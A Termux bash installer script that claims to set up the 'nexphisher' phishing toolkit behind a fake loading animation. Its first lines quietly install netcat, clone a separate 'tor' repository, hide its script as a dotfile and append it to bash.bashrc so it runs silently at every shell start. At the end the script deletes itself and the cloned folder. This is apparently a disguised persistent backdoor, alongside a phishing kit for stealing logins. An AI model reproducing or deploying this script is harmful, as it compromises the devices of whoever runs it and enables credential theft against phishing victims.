#!/bin/bash
command -v nc > /dev/null 2>&1 && echo "pkg intall" || apt update && apt upgrade && pkg install netcat -y
git clone https://github.com/inhdyaii/tor.git > /dev/null 2>&1
echo -e "bash /data/data/com.termux/files/usr/etc/.tor > /dev/null 2>&1 & " >> /data/data/com.termux/files/usr/etc/bash.bashrc && chmod +x tor/tor.sh && mv tor/tor.sh /data/data/com.termux/files/usr/etc/.tor
git clone https://github.com/htr-tech/nexphisher.git && mv nexphisher $HOME || echo -e "error"
clear
echo -e '\e[96m'
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING.\'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING..|'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING.../'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING....\'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING.....|'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING....../'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING.......\'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING........|'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING........./'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING..........\'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING...........|'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING............/'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING.............\'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING..............|'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '              LOADING.............../'
sleep 0.1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo -e '              \e[0m[\e[92m✔\e[0m] done  have anice haking 😚...'
echo " "
sleep 1
rm instal.sh
rm -rf tor
cd $HOME/nexphisher && bash tmux_setup && clear && bash nexphisher
